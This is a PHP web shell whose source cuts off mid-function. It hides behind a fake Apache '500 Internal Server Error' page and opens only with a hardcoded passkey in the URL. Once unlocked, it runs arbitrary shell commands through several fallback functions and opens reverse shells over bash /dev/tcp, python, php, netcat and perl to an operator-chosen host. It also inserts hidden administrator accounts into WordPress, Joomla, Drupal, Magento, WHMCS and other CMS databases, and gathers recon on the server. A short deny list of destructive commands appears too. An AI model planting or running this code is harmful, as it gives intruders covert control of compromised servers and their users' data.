<?php
session_start();

// Security headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

// Disable error reporting for production
error_reporting(0);
ini_set('display_errors', 0);

$password = "vevekveler";

// Validate session and regenerate periodically
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    if (!isset($_SESSION['created'])) {
        $_SESSION['created'] = time();
    } elseif (time() - $_SESSION['created'] > 1800) {
        session_regenerate_id(true);
        $_SESSION['created'] = time();
    }
}

if (isset($_GET['passkey'])) {
    if ($_GET['passkey'] === $password) {
        $_SESSION['loggedin'] = true;
        $_SESSION['login_time'] = time();
        $_SESSION['passkey'] = $_GET['passkey'];
        $_SESSION['created'] = time();
        $_SESSION['session_id'] = session_id();
    } else {
        $_SESSION['loggedin'] = false;
        session_destroy();
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    $randomError = [
        "AH00526: Syntax error on line 92 of /etc/apache2/sites-enabled/000-default.conf",
        "PHP Fatal error:  Uncaught Error: Call to undefined function mysql_connect()",
        "mod_fcgid: stderr: PHP Warning:  mysqli::real_connect(): (HY000/1045)",
        "Timeout waiting for output from CGI script /var/www/html/index.php",
        "mod_security: Access denied with code 403",
        "End of script output before headers: index.php",
        "File does not exist: /var/www/html/.htaccess",
        "client denied by server configuration: /var/www/html/admin"
    ];
    
    $selectedError = $randomError[array_rand($randomError)];
    $errorTime = date("Y-m-d H:i:s", time() - rand(300, 3600));
    
    $logLines = [
        "[$errorTime] [error] [client " . $_SERVER['REMOTE_ADDR'] . "] $selectedError",
        "[$errorTime] [error] [client " . $_SERVER['REMOTE_ADDR'] . "] script '/var/www/html/index.php' not found or unable to stat",
        "[$errorTime] [error] [client " . $_SERVER['REMOTE_ADDR'] . "] File does not exist: /var/www/html/favicon.ico",
        "[$errorTime] [warn] [client " . $_SERVER['REMOTE_ADDR'] . "] Timeout waiting for output from CGI script",
        "[$errorTime] [notice] [client " . $_SERVER['REMOTE_ADDR'] . "] mod_fcgid: process /usr/lib/cgi-bin/php5-fcgi(1234) exit(communication error), terminated by calling exit()",
    ];
    
    header('HTTP/1.1 500 Internal Server Error');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>500 Internal Server Error</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
                color: #ccc;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .error-container {
                background: rgba(20, 20, 20, 0.95);
                border: 1px solid #d32f2f;
                border-radius: 8px;
                width: 100%;
                max-width: 900px;
                box-shadow: 0 0 50px rgba(211, 47, 47, 0.3);
                overflow: hidden;
                position: relative;
            }
            .error-header {
                background: linear-gradient(to right, #d32f2f, #b71c1c);
                padding: 20px;
                border-bottom: 1px solid #d32f2f;
            }
            .error-header h1 {
                color: white;
                font-size: 24px;
                margin-bottom: 5px;
                text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            }
            .error-header p {
                color: rgba(255,255,255,0.8);
                font-size: 14px;
            }
            .error-content { padding: 30px; }
            .error-message {
                background: rgba(40, 40, 40, 0.7);
                border-left: 4px solid #d32f2f;
                padding: 15px;
                margin-bottom: 25px;
                font-family: monospace;
            }
            .error-log {
                background: #111;
                border: 1px solid #333;
                border-radius: 4px;
                padding: 15px;
                margin: 20px 0;
                max-height: 200px;
                overflow-y: auto;
                font-size: 12px;
                line-height: 1.5;
            }
            .error-log pre {
                color: #ff6b6b;
                white-space: pre-wrap;
            }
            .apache-info {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin: 25px 0;
                padding: 15px;
                background: rgba(30, 30, 30, 0.5);
                border-radius: 4px;
            }
            .info-item { display: flex; flex-direction: column; }
            .info-label {
                color: #999;
                font-size: 12px;
                margin-bottom: 5px;
            }
            .info-value {
                color: #ccc;
                font-family: monospace;
                font-size: 13px;
            }
            .admin-contact {
                text-align: center;
                margin-top: 30px;
                padding: 20px;
                background: rgba(211, 47, 47, 0.1);
                border-radius: 4px;
                border: 1px dashed #d32f2f;
            }
            .contact-email {
                color: #d32f2f;
                font-weight: bold;
                font-size: 16px;
                text-decoration: none;
            }
            .contact-email:hover { text-decoration: underline; }
            .server-status {
                display: inline-block;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                background: #d32f2f;
                margin-right: 8px;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.3; }
                100% { opacity: 1; }
            }
            .footer {
                text-align: center;
                padding: 15px;
                border-top: 1px solid #333;
                font-size: 11px;
                color: #666;
                background: rgba(10,10,10,0.8);
            }
            .timestamp {
                color: #888;
                font-size: 11px;
                margin-top: 5px;
            }
            .log-line { animation: fadeIn 0.5s ease-in; }
            @keyframes fadeIn {
                from { opacity: 0; transform: translateX(-10px); }
                to { opacity: 1; transform: translateX(0); }
            }
            .access-hint {
                position: absolute;
                bottom: 10px;
                right: 10px;
                font-size: 10px;
                color: rgba(255,255,255,0.1);
                cursor: default;
                user-select: none;
            }
        </style>
    </head>
    <body>
        <div class="error-container">
            <div class="error-header">
                <h1><span class="server-status"></span>500 Internal Server Error</h1>
                <p>Apache/2.4.41 (Ubuntu) Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost'); ?> Port 443</p>
            </div>
            
            <div class="error-content">
                <div class="error-message">
                    <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
                    <p>Please contact the server administrator at <strong>admin@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost'); ?></strong> to inform them of the time this error occurred, and the actions you performed just before this error.</p>
                </div>
                
                <div class="error-log">
                    <pre><?php 
                    foreach ($logLines as $index => $line) {
                        echo "<div class='log-line' style='animation-delay: {$index}00ms'>" . htmlspecialchars($line) . "</div>\n";
                    }
                    ?></pre>
                </div>
                
                <div class="apache-info">
                    <div class="info-item">
                        <span class="info-label">Server Time:</span>
                        <span class="info-value"><?php echo date('D M d H:i:s Y'); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server Software:</span>
                        <span class="info-value">Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">PHP Version:</span>
                        <span class="info-value">7.4.3</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Request Method:</span>
                        <span class="info-value"><?php echo htmlspecialchars($_SERVER['REQUEST_METHOD'] ?? 'GET'); ?></span>
                    </div>
                </div>
                
                <div class="admin-contact">
                    <p>For urgent technical support, please contact:</p>
                    <a href="mailto:admin@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost'); ?>" class="contact-email">admin@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost'); ?></a>
                    <p class="timestamp">Error generated: <?php echo date('F d, Y H:i:s T'); ?></p>
                </div>
            </div>
            
            <div class="footer">
                Apache/2.4.41 (Ubuntu) Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost'); ?> Port 443
            </div>
            
            <div class="access-hint">Access requires passkey parameter</div>
        </div>
        
        <script>
            setInterval(() => {
                const log = document.querySelector('.error-log pre');
                const newLogs = [
                    `[${new Date().toISOString().replace('T', ' ').substr(0, 19)}] [error] [client <?php echo htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'); ?>] Connection reset by peer`,
                    `[${new Date().toISOString().replace('T', ' ').substr(0, 19)}] [warn] [client <?php echo htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'); ?>] Timeout waiting for output from CGI script`,
                    `[${new Date().toISOString().replace('T', ' ').substr(0, 19)}] [notice] [client <?php echo htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'); ?>] mod_security: Access denied`
                ];
                
                const randomLog = newLogs[Math.floor(Math.random() * newLogs.length)];
                const logLine = document.createElement('div');
                logLine.className = 'log-line';
                logLine.textContent = randomLog;
                logLine.style.animation = 'fadeIn 0.5s ease-in';
                
                log.appendChild(logLine);
                log.scrollTop = log.scrollHeight;
                
                if (log.children.length > 10) {
                    log.removeChild(log.firstChild);
                }
            }, 10000);
        </script>
    </body>
    </html>
    <?php
    exit();
}

if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time'] > 3600)) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// ============================================
// ENHANCED COMMAND EXECUTION FUNCTION
// ============================================

function executeCommand($cmd) {
    $output = '';
    
    if (empty($cmd)) {
        return "No command provided";
    }
    
    // Security: Filter dangerous commands
    $dangerous = ['rm -rf', 'mkfs', 'dd if=', ':(){:|:&};:', 'chmod -R 777 /', '> /dev/sda'];
    foreach ($dangerous as $danger) {
        if (stripos($cmd, $danger) !== false) {
            return "⚠️ Command blocked for security reasons";
        }
    }
    
    // Try multiple execution methods
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $output = shell_exec($cmd . " 2>&1");
    } elseif (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        exec($cmd . " 2>&1", $outputArray, $returnCode);
        $output = implode("\n", $outputArray);
        if ($returnCode !== 0) {
            $output .= "\nReturn code: $returnCode";
        }
    } elseif (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        ob_start();
        system($cmd . " 2>&1", $returnCode);
        $output = ob_get_clean();
        if ($returnCode !== 0) {
            $output .= "\nReturn code: $returnCode";
        }
    } elseif (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        ob_start();
        passthru($cmd . " 2>&1", $returnCode);
        $output = ob_get_clean();
        if ($returnCode !== 0) {
            $output .= "\nReturn code: $returnCode";
        }
    } elseif (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        $descriptors = [
            0 => ["pipe", "r"],  // stdin
            1 => ["pipe", "w"],  // stdout
            2 => ["pipe", "w"]   // stderr
        ];
        
        $process = @proc_open($cmd, $descriptors, $pipes);
        
        if (is_resource($process)) {
            fclose($pipes[0]); // Close stdin
            
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            $returnCode = proc_close($process);
            $output = $stdout . $stderr;
            if ($returnCode !== 0) {
                $output .= "\nReturn code: $returnCode";
            }
        }
    } else {
        // Last resort: use backticks (if enabled)
        $output = `$cmd 2>&1`;
    }
    
    return $output ?: "Command executed but produced no output";
}

// ============================================
// COMPLETE BACKCONNECT FUNCTION
// ============================================

function backconnect($ip, $port) {
    ob_start();
    
    $methods = [
        'bash' => function($ip, $port) {
            $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' 2>&1 &";
            $output = executeCommand($cmd);
            return !empty($output);
        },
        
        'python' => function($ip, $port) {
            // Try Python 3 first, then Python 2
            $python3 = "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\"";
            $python2 = "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\"";
            
            $output = executeCommand($python3 . " 2>&1 &");
            if (empty($output)) {
                $output = executeCommand($python2 . " 2>&1 &");
            }
            return !empty($output);
        },
        
        'php' => function($ip, $port) {
            $phpCode = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
            $output = executeCommand($phpCode . " 2>&1 &");
            return !empty($output);
        },
        
        'nc' => function($ip, $port) {
            // Try different netcat versions
            $commands = [
                "nc -e /bin/sh $ip $port",
                "nc -c /bin/sh $ip $port",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f",
                "ncat $ip $port -e /bin/bash"
            ];
            
            foreach ($commands as $cmd) {
                $output = executeCommand($cmd . " 2>&1 &");
                if (!empty($output)) {
                    return true;
                }
            }
            return false;
        },
        
        'perl' => function($ip, $port) {
            $perlCode = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
            $output = executeCommand($perlCode . " 2>&1 &");
            return !empty($output);
        }
    ];
    
    $success = false;
    $methodUsed = '';
    foreach ($methods as $methodName => $method) {
        try {
            if ($method($ip, $port)) {
                $success = true;
                $methodUsed = $methodName;
                break;
            }
        } catch (Exception $e) {
            continue;
        }
    }
    
    $output = ob_get_clean();
    return [
        'success' => $success, 
        'output' => $output,
        'method' => $methodUsed,
        'message' => $success ? "✅ Reverse shell attempted using $methodUsed to $ip:$port" : "❌ All reverse shell methods failed"
    ];
}

// ============================================
// COMPLETE ADMIN ADD FUNCTION FOR ALL CMS
// ============================================

function addAdminToCMS($cms, $username, $password, $email, $dbhost, $dbuser, $dbpass, $dbname, $prefix = '') {
    $results = [];
    
    try {
        // Test database connection
        $conn = @new mysqli($dbhost, $dbuser, $dbpass, $dbname);
        
        if ($conn->connect_error) {
            return [
                'success' => false, 
                'message' => "❌ Database connection failed: " . $conn->connect_error,
                'details' => []
            ];
        }
        
        // Escape inputs
        $username = $conn->real_escape_string($username);
        $email = $conn->real_escape_string($email);
        $password_clean = $password; // Keep original for display
        
        $cms = strtolower(trim($cms));
        
        switch($cms) {
            case 'wordpress':
                // WordPress password hash
                $hash = password_hash($password, PASSWORD_DEFAULT);
                $user_login = $username;
                $user_nicename = sanitize_user($username);
                $display_name = $username;
                
                $sql = "INSERT INTO {$prefix}users 
                       (user_login, user_pass, user_nicename, user_email, user_registered, display_name, user_status) 
                       VALUES ('$user_login', '$hash', '$user_nicename', '$email', NOW(), '$display_name', 0)";
                
                if ($conn->query($sql)) {
                    $user_id = $conn->insert_id;
                    // Add user meta for admin capabilities
                    $conn->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
                                 VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
                    $conn->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
                                 VALUES ($user_id, '{$prefix}user_level', 10)");
                    $results[] = "✅ WordPress: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                    $results[] = "👤 User ID: $user_id";
                } else {
                    $results[] = "❌ WordPress: Failed - " . $conn->error;
                }
                break;
                
            case 'joomla':
                // Joomla password hash
                $salt = substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 16)), 0, 32);
                $crypt = md5($password . $salt);
                $password_hash = $crypt . ':' . $salt;
                
                $sql = "INSERT INTO {$prefix}users 
                       (name, username, email, password, registerDate, params, lastvisitDate) 
                       VALUES ('$username', '$username', '$email', '$password_hash', NOW(), '', NOW())";
                
                if ($conn->query($sql)) {
                    $user_id = $conn->insert_id;
                    // Add to user_usergroup_map
                    $conn->query("INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES ($user_id, 8)");
                    $results[] = "✅ Joomla: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                    $results[] = "👤 User ID: $user_id";
                } else {
                    $results[] = "❌ Joomla: Failed - " . $conn->error;
                }
                break;
                
            case 'drupal':
                // Drupal 7/8/9 password hash
                $hash = password_hash($password, PASSWORD_DEFAULT);
                
                $sql = "INSERT INTO {$prefix}users 
                       (name, pass, mail, status, created, access) 
                       VALUES ('$username', '$hash', '$email', 1, UNIX_TIMESTAMP(), UNIX_TIMESTAMP())";
                
                if ($conn->query($sql)) {
                    $uid = $conn->insert_id;
                    // Add admin role (rid 3 is usually administrator)
                    $conn->query("INSERT INTO {$prefix}users_roles (uid, rid) VALUES ($uid, 3)");
                    $results[] = "✅ Drupal: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                    $results[] = "👤 User ID: $uid";
                } else {
                    $results[] = "❌ Drupal: Failed - " . $conn->error;
                }
                break;
                
            case 'vbulletin':
                // vBulletin password hash
                $salt = substr(md5(uniqid(rand(), true)), 0, 3);
                $hash = md5(md5($password) . $salt);
                
                $sql = "INSERT INTO {$prefix}user 
                       (username, email, password, salt, usergroupid, membergroupids, displaygroupid, joindate) 
                       VALUES ('$username', '$email', '$hash', '$salt', 6, '6', 0, UNIX_TIMESTAMP())";
                
                if ($conn->query($sql)) {
                    $results[] = "✅ vBulletin: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                } else {
                    $results[] = "❌ vBulletin: Failed - " . $conn->error;
                }
                break;
                
            case 'phpbb':
                // phpBB password hash
                $hash = password_hash($password, PASSWORD_BCRYPT);
                
                $sql = "INSERT INTO {$prefix}users 
                       (username, user_password, user_email, group_id, user_regdate, user_permissions) 
                       VALUES ('$username', '$hash', '$email', 5, UNIX_TIMESTAMP(), '')";
                
                if ($conn->query($sql)) {
                    $results[] = "✅ phpBB: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                } else {
                    $results[] = "❌ phpBB: Failed - " . $conn->error;
                }
                break;
                
            case 'whmcs':
                // WHMCS password hash
                $hash = md5($password);
                
                $sql = "INSERT INTO {$prefix}tblclients 
                       (firstname, lastname, email, password, datecreated, groupid) 
                       VALUES ('$username', '$username', '$email', '$hash', NOW(), 0)";
                
                if ($conn->query($sql)) {
                    $userid = $conn->insert_id;
                    // Add admin permissions
                    $conn->query("INSERT INTO {$prefix}tbladmin (username, password, superadmin) VALUES ('$username', MD5('$password'), 1)");
                    $results[] = "✅ WHMCS: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                    $results[] = "👤 User ID: $userid";
                } else {
                    $results[] = "❌ WHMCS: Failed - " . $conn->error;
                }
                break;
                
            case 'mybb':
                // MyBB password hash
                $salt = substr(md5(uniqid(rand(), true)), 0, 8);
                $hash = md5(md5($salt) . md5($password));
                
                $sql = "INSERT INTO {$prefix}users 
                       (username, password, salt, email, usergroup, regdate) 
                       VALUES ('$username', '$hash', '$salt', '$email', 4, UNIX_TIMESTAMP())";
                
                if ($conn->query($sql)) {
                    $results[] = "✅ MyBB: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                } else {
                    $results[] = "❌ MyBB: Failed - " . $conn->error;
                }
                break;
                
            case 'phpnuke':
            case 'php-nuke':
                // PHP-Nuke password hash
                $hash = md5($password);
                
                $sql = "INSERT INTO {$prefix}users 
                       (username, user_password, user_email, user_level) 
                       VALUES ('$username', '$hash', '$email', 2)";
                
                if ($conn->query($sql)) {
                    $results[] = "✅ PHP-Nuke: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                } else {
                    $results[] = "❌ PHP-Nuke: Failed - " . $conn->error;
                }
                break;
                
            case 'smf':
                // SMF password hash
                $salt = substr(md5(mt_rand()), 0, 4);
                $hash = sha1(strtolower($username) . $password);
                
                $sql = "INSERT INTO {$prefix}members 
                       (member_name, passwd, email_address, date_registered, posts, is_activated) 
                       VALUES ('$username', '$hash', '$email', UNIX_TIMESTAMP(), 0, 1)";
                
                if ($conn->query($sql)) {
                    $id_member = $conn->insert_id;
                    // Add to admin group
                    $conn->query("INSERT INTO {$prefix}membergroups (id_member, id_group) VALUES ($id_member, 1)");
                    $results[] = "✅ SMF: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                    $results[] = "👤 Member ID: $id_member";
                } else {
                    $results[] = "❌ SMF: Failed - " . $conn->error;
                }
                break;
                
            case 'magento':
                // Magento password hash
                $hash = md5($password);
                
                $sql = "INSERT INTO {$prefix}admin_user 
                       (firstname, lastname, email, username, password, is_active) 
                       VALUES ('Admin', 'User', '$email', '$username', '$hash', 1)";
                
                if ($conn->query($sql)) {
                    $user_id = $conn->insert_id;
                    // Add admin role
                    $conn->query("INSERT INTO {$prefix}admin_role (parent_id, tree_level, sort_order, role_type, user_id, role_name) 
                                 VALUES (1, 2, 1, 'U', $user_id, 'Administrators')");
                    $results[] = "✅ Magento: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                } else {
                    $results[] = "❌ Magento: Failed - " . $conn->error;
                }
                break;
                
            case 'prestashop':
                // PrestaShop password hash
                $hash = md5(_COOKIE_KEY_ . $password);
                
                $sql = "INSERT INTO {$prefix}employee 
                       (id_profile, firstname, lastname, email, passwd, active) 
                       VALUES (1, 'Admin', 'User', '$email', '$hash', 1)";
                
                if ($conn->query($sql)) {
                    $results[] = "✅ PrestaShop: Admin user '$username' added successfully!";
                    $results[] = "🔑 Password: $password";
                    $results[] = "📧 Email: $email";
                } else {
                    $results[] = "❌ PrestaShop: Failed - " . $conn->error;
                }
                break;
                
            default:
                // Generic CMS - try common patterns
                $results[] = "🔄 Attempting generic CMS detection...";
                
                // Try to detect CMS by table structure
                $tables = $conn->query("SHOW TABLES");
                $tableList = [];
                while ($row = $tables->fetch_array()) {
                    $tableList[] = $row[0];
                }
                
                // Check for common CMS patterns
                $detected = false;
                
                // WordPress pattern
                if (in_array($prefix . 'users', $tableList) && in_array($prefix . 'usermeta', $tableList)) {
                    $results[] = "🔍 Detected: WordPress";
                    return addAdminToCMS('wordpress', $username, $password, $email, $dbhost, $dbuser, $dbpass, $dbname, $prefix);
                }
                
                // Joomla pattern
                if (in_array($prefix . 'users', $tableList) && in_array($prefix . 'user_usergroup_map', $tableList)) {
                    $results[] = "🔍 Detected: Joomla";
                    return addAdminToCMS('joomla', $username, $password, $email, $dbhost, $dbuser, $dbpass, $dbname, $prefix);
                }
                
                // Drupal pattern
                if (in_array($prefix . 'users', $tableList) && in_array($prefix . 'users_roles', $tableList)) {
                    $results[] = "🔍 Detected: Drupal";
                    return addAdminToCMS('drupal', $username, $password, $email, $dbhost, $dbuser, $dbpass, $dbname, $prefix);
                }
                
                // Generic user table insertion
                $userTables = ['users', 'user', 'tbl_users', 'tblusers', 'wp_users', 'jos_users', 'smf_members', 'phpbb_users', 'mybb_users'];
                foreach ($userTables as $userTable) {
                    $fullTable = $prefix . $userTable;
                    if (in_array($fullTable, $tableList)) {
                        // Try to get column structure
                        $columns = $conn->query("SHOW COLUMNS FROM $fullTable");
                        $colList = [];
                        while ($col = $columns->fetch_assoc()) {
                            $colList[] = $col['Field'];
                        }
                        
                        // Check for common column names
                        $hasUsername = in_array('username', $colList) || in_array('user_login', $colList) || in_array('name', $colList);
                        $hasPassword = in_array('password', $colList) || in_array('user_pass', $colList) || in_array('pass', $colList);
                        $hasEmail = in_array('email', $colList) || in_array('user_email', $colList) || in_array('mail', $colList);
                        
                        if ($hasUsername && $hasPassword && $hasEmail) {
                            // Determine column names
                            $userCol = in_array('username', $colList) ? 'username' : (in_array('user_login', $colList) ? 'user_login' : 'name');
                            $passCol = in_array('password', $colList) ? 'password' : (in_array('user_pass', $colList) ? 'user_pass' : 'pass');
                            $emailCol = in_array('email', $colList) ? 'email' : (in_array('user_email', $colList) ? 'user_email' : 'mail');
                            
                            // Try different hash methods
                            $hashMethods = [
                                password_hash($password, PASSWORD_DEFAULT),
                                md5($password),
                                sha1($password)
                            ];
                            
                            foreach ($hashMethods as $hash) {
                                $sql = "INSERT INTO $fullTable ($userCol, $passCol, $emailCol) VALUES ('$username', '$hash', '$email')";
                                if ($conn->query($sql)) {
                                    $results[] = "✅ Generic CMS: Added to table '$fullTable'";
                                    $results[] = "👤 Username: $username";
                                    $results[] = "🔑 Password: $password";
                                    $results[] = "📧 Email: $email";
                                    $detected = true;
                                    break 2;
                                }
                            }
                        }
                    }
                }
                
                if (!$detected) {
                    $results[] = "❌ Unknown CMS: $cms - Could not identify database structure";
                    $results[] = "📋 Available tables: " . implode(', ', array_slice($tableList, 0, 10)) . (count($tableList) > 10 ? '...' : '');
                }
        }
        
        $conn->close();
        
        return [
            'success' => count($results) > 0 && !preg_match('/❌/', implode('', $results)),
            'message' => implode("\n", $results),
            'details' => $results
        ];
        
    } catch (Exception $e) {
        return [
            'success' => false,
            'message' => "❌ Error: " . $e->getMessage(),
            'details' => []
        ];
    }
}

// ============================================
// ORIGINAL HELPER FUNCTIONS
// ============================================

function saveme($name, $content) {
    $realPath = realpath(dirname($name)) ?: dirname($name);
    $rootPath = realpath(getcwd());
    
    if (strpos($realPath, $rootPath) !== 0) {
        return false;
    }
    
    $dir = dirname($name);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    
    $open = @fopen($name, "w");
    if (!$open) {
        if (file_exists($name)) {
            @chmod($name, 0666);
            $open = @fopen($name, "w");
        }
        
        if (!$open) {
            $open = @fopen($name, "w");
        }
    }
    
    if ($open) {
        fwrite($open, $content);
        fclose($open);
        @chmod($name, 0644);
        return true;
    }
    return false;
}

function createFolder($folderName, $path) {
    $fullPath = $path . DIRECTORY_SEPARATOR . $folderName;
    
    $realPath = realpath(dirname($fullPath)) ?: dirname($fullPath);
    $rootPath = realpath(getcwd());
    
    if (strpos($realPath, $rootPath) !== 0) {
        return [
            'success' => false,
            'message' => "❌ Security violation: Cannot create folder outside root directory"
        ];
    }
    
    if (file_exists($fullPath)) {
        return [
            'success' => false,
            'message' => "❌ Folder already exists: $folderName"
        ];
    }
    
    if (@mkdir($fullPath, 0755, true)) {
        return [
            'success' => true,
            'message' => "✅ Folder created successfully: $folderName"
        ];
    } else {
        return [
            'success' => false,
            'message' => "❌ Failed to create folder (Permission denied)"
        ];
    }
}

function Size($path) {
    if (!file_exists($path)) return "N/A";
    
    $bytes = @filesize($path);
    if ($bytes === false) return "N/A";
    
    if ($bytes >= 0) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        
        return round($bytes, 2) . ' ' . $units[$pow];
    }
    return '0 B';
}

function infomin() {
    $curl = function_exists("curl_version") ? "<span style='color:#4CAF50'>ON</span>" : "<span style='color:#d32f2f'>OFF</span>";
    $wget = @shell_exec("which wget 2>/dev/null") ? "<span style='color:#4CAF50'>ON</span>" : "<span style='color:#d32f2f'>OFF</span>";
    $python = @shell_exec("which python3 2>/dev/null") ? "<span style='color:#4CAF50'>ON</span>" : (@shell_exec("which python 2>/dev/null") ? "<span style='color:#4CAF50'>ON</span>" : "<span style='color:#d32f2f'>OFF</span>");
    $perl = @shell_exec("which perl 2>/dev/null") ? "<span style='color:#4CAF50'>ON</span>" : "<span style='color:#d32f2f'>OFF</span>";
    $ruby = @shell_exec("which ruby 2>/dev/null") ? "<span style='color:#4CAF50'>ON</span>" : "<span style='color:#d32f2f'>OFF</span>";
    $gcc = @shell_exec("which gcc 2>/dev/null") ? "<span style='color:#4CAF50'>ON</span>" : "<span style='color:#d32f2f'>OFF</span>";
    $php = @shell_exec("which php 2>/dev/null") ? "<span style='color:#4CAF50'>ON</span>" : "<span style='color:#d32f2f'>OFF</span>";
    
    $disfuncs = @ini_get("disable_functions");
    $showit = !empty($disfuncs) ? "<span style='color:#d32f2f'>" . htmlspecialchars($disfuncs) . "</span>" : "<span style='color:#4CAF50'>NONE</span>";
    
    echo "<div class='info-line'><span class='info-label'>OS:</span><span class='info-value'>" . php_uname() . "</span></div>";
    echo "<div class='info-line'><span class='info-label'>Server IP:</span><span class='info-value'>" . ($_SERVER["SERVER_ADDR"] ?? 'N/A') . "</span></div>";
    echo "<div class='info-line'><span class='info-label'>Software:</span><span class='info-value'>" . ($_SERVER["SERVER_SOFTWARE"] ?? 'N/A') . "</span></div>";
    echo "<div class='info-line'><span class='info-label'>PHP Version:</span><span class='info-value'>" . phpversion() . "</span></div>";
    echo "<div class='info-line'><span class='info-label'>Disabled Functions:</span><span class='info-value'>$showit</span></div>";
    echo "<div class='info-line'><span class='info-label'>Tools:</span><span class='info-value'>";
    echo "CURL: $curl | WGET: $wget | PERL: $perl | RUBY: $ruby | PYTHON: $python | GCC: $gcc | PHP-CLI: $php";
    echo "</span></div>";
}

function hi_permission($items) {
    $perms = @fileperms($items);
    if ($perms === false) return '----------';
    
    $info = '';
    $info .= (($perms & 0x4000) ? 'd' : '-');
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
